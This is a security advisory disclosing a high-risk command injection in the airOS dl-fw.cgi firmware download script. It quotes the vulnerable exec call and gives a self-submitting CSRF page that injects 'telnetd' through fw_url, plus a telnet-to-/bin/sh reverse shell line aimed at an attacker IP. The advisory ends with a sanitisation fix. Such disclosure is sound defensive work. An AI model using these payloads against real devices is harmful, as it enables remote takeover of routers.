Risk: High

Summary:
--------
The dl-fw.cgi script does not properly sanitize URLs passed via the fw_url parameter, allowing
arbitrary shell commands to be provided as part of the input.

Location: 
---------
/usr/www/dl-fw.cgi

Impact:
-------
This issue can be used to execute arbitrary shell commands on the device.
 
Details:
--------
The airOS XM, XW, and TI lines (and potentially others) all contain a utility script
called dl-fw.cgi that is hosted in the webroot. This script is used in conjunction
with other functionality to download/display EULAs and download firmware updates.

This script can be called directly via POSTs, since it is within the webroot. On Line 62-63,
the script executes the following using a specified fw_url parameter:

62: $cmd = "$cmd_wget -O $firmware_file --header='Referer: $eula_url ' $fw_url > $progress_file 2>&1";
63: exec($cmd, $lines, $res);

No sanitization is performed on fw_url, which allows an attacker to specify arbitrary shell commands
which are in turn passed to exec. For instance, the following example uses the URL
http://www.nccgroup.trust/testtest123/`telnetd`, along with a cross-site request forgery attack
to start the telnet service:

<html>
  <body>
    <form action="https://192.168.1.1/dl-fw.cgi" method="POST">
      <input type="hidden" name="action" value="download" />
      <input type="hidden" name="fw&#95;url" value="http&#58;&#47;&#47;www&#46;nccgroup&#46;trust&#47;testtest123&#47;&#96;telnetd&#96;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

This can also be used to open a reverse shell via telnet, for instance by injecting:

telnet <attacker ip> <port1> | /bin/sh | telnet <attacker ip> port2

Recommendation:
----------------
Sanitize the fw_url parameter to remove/encode shell metacharacters using EscapeShellCmd
(as done elsewhere) or similar methods.
